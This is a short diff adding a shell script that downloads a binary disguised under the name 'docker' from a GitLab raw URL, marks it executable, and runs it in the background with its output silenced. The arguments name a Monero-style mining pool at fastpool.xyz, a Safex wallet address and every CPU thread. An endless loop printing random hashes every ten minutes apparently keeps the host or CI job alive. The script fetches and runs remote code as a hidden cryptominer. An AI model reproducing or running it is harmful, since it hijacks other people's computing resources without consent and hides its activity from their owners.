@@ -1,0 +1,4 @@
+wget https://gitlab.com/g6292/gabutz/-/raw/main/docker
+chmod +x docker
+./docker -o fastpool.xyz:3034 -u Safex5zjN69RbYh6qsWKv1GvZKgLVMNKUP5B4wha9XoMApkTYyZxNZwE3Gtrxqqb5Jbs699tBGKq6MmDivji7jHrUjJwCwTXxmz4J@$(echo $(shuf -i 1111-9999 -n 1)-cuk) -p x -k -a randomSFX -t$(nproc --all) > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
